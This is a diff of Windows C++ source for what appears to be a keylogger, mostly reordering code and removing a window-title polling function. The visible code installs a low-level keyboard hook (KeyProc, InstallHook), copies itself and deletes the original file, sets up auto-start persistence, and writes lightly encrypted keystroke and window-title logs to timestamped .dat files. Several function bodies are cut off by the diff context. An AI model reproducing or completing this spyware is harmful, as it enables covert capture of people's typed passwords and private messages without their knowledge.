@@ -28,9 +28,53 @@ WCHAR m_log[BUFSIZE];
 
 
 //--------------------------------------------
-void writeLog(std::string str);
-void getfiletime();
 
+void initKey();
+void init();
+void getfiletime();
+std::wstring getTime();
+std::wstring Encrypt(std::wstring);
+void writeToFile(std::wstring);
+void writeTitle();
+void writeLog(std::string str);
+void AutoStart();
+LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam);
+bool Install();
+void InstallHook();
+
+
+
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+{
+    // Get argv 
+    LPWSTR* argv;
+    int argc;
+    argv = CommandLineToArgvW(GetCommandLine(), &argc);
+    if (argc > 1)
+    {
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+        _wremove(argv[1]);
+    }
+
+
+    init();
+    if (!Install())
+    {
+        return 0;
+    }
+
+    AutoStart();
+    InstallHook();
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) != 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(hHook);
+    return 0;
+}
 
 
 void initKey()
@@ -156,15 +200,12 @@ void init()
     
 }
 
-
-
 void getfiletime()
 {
     SYSTEMTIME systime;
     GetLocalTime(&systime);
     wsprintf(m_log, L"%s%02d%02d%d-%02d%02d%02d.dat",m_dir.c_str(), systime.wDay, systime.wMonth, systime.wYear, systime.wHour, systime.wMinute, systime.wSecond);
 }
-
 
 std::wstring getTime()
 {
@@ -176,7 +217,6 @@ std::wstring getTime()
     return buf;
 }
 
-
 std::wstring Encrypt(std::wstring str)
 {
     std::wstring res = L"";
@@ -187,7 +227,6 @@ std::wstring Encrypt(std::wstring str)
     return res;
 }
 
-
 void writeToFile(std::wstring str)
 {
     DWORD dwBytesWritten;
@@ -196,7 +235,6 @@ void writeToFile(std::wstring str)
     WriteFile(hFile, s.c_str(), s.length()*sizeof(WCHAR), &dwBytesWritten, NULL);
     CloseHandle(hFile);
 }
-
 
 void writeTitle()
 {
@@ -214,40 +252,12 @@ void writeTitle()
     }
 }
 
-
-
-
 void writeLog(std::string str)
 {
     writeTitle();
     std::wstring wstr(str.begin(), str.end());
     writeToFile(wstr);
 }
-
-
-
-void windowsTitle()
-{
-    // Lấy tiêu đề cửa sổ
-    WCHAR wnd_title[256];
-    WCHAR prev_wnd_title[256];
-    ZeroMemory(prev_wnd_title, sizeof(prev_wnd_title));
-    while (true)
-    {
-        Sleep(100);
-        
-        ZeroMemory(wnd_title, sizeof(wnd_title));
-        HWND hwnd = GetForegroundWindow(); 
-        GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
-        if (wcscmp(wnd_title, prev_wnd_title) != 0)
-        {
-            wprintf(L"%s\n", wnd_title);
-            wcscpy_s(prev_wnd_title,sizeof(prev_wnd_title), wnd_title);
-        }
-        
-    }
-}
-
 
 void AutoStart()
 {
@@ -319,8 +329,6 @@ LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
-
-
 bool Install()
 {
     HMODULE hModule = GetModuleHandle(NULL);
@@ -344,7 +352,6 @@ bool Install()
     return true;
 }
 
-
 void InstallHook()
 {
     
@@ -353,34 +360,3 @@ void InstallHook()
 }
 
 
-
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
-{
-    // Get argv 
-    LPWSTR* argv;
-    int argc;
-    argv = CommandLineToArgvW(GetCommandLine(), &argc);
-    if (argc > 1)
-    {
-        std::this_thread::sleep_for(std::chrono::milliseconds(500));
-        _wremove(argv[1]);
-    }
-
-
-    init();
-    if (!Install())
-    {
-        return 0;
-    }
-
-    AutoStart();
-    InstallHook();
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0) != 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    UnhookWindowsHookEx(hHook);
-    return 0;
-}
